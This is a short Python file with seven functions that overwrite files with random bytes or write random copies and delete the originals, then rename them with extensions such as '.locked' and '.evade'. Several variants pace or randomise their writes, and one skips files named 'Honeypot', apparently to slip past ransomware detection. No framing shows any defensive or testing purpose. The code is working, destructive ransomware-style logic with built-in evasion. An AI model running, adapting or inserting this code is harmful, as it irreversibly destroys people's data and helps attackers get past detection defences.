import os, time, random

def inplace_fast(files, rate, log_func=None):
    for p in files:
        try:
            with open(p, "r+b") as f:
                n = os.path.getsize(p); f.write(os.urandom(n))
            new_p = p + ".locked"; os.rename(p, new_p)
            time.sleep(1.0 / rate)
        except OSError: pass

def copy_delete(files, rate, log_func=None):
    for p in files:
        try:
            new_p = p + ".enc"
            with open(new_p, "wb") as f: f.write(os.urandom(os.path.getsize(p)))
            os.remove(p); time.sleep(1.0 / rate)
        except OSError: pass

def rename_only(files, rate, log_func=None):
    for p in files:
        try:
            os.rename(p, p + ".crypto"); time.sleep(1.0 / rate)
        except OSError: pass

def intermittent(files, rate, log_func=None):
    for idx, p in enumerate(files):
        try:
            with open(p, "r+b") as f: f.write(os.urandom(os.path.getsize(p)))
            os.rename(p, p + ".evade")
            time.sleep(random.uniform(0.5, 1.2) if idx % 5 == 0 else 1.0 / rate)
        except OSError: pass

def slow_low(files, rate, log_func=None):
    for p in files:
        try:
            with open(p, "r+b") as f: f.write(os.urandom(os.path.getsize(p)))
            os.rename(p, p + ".slow"); time.sleep(0.4)
        except OSError: pass

def burst_throttled(files, rate, log_func=None):
    for i in range(0, len(files), 10):
        chunk = files[i:i+10]
        inplace_fast(chunk, rate=rate)
        time.sleep(1.5)

def honeypot_avoid(files, rate, log_func=None):
    safe_files = [f for f in files if "Honeypot" not in f]
    inplace_fast(safe_files, rate=rate)
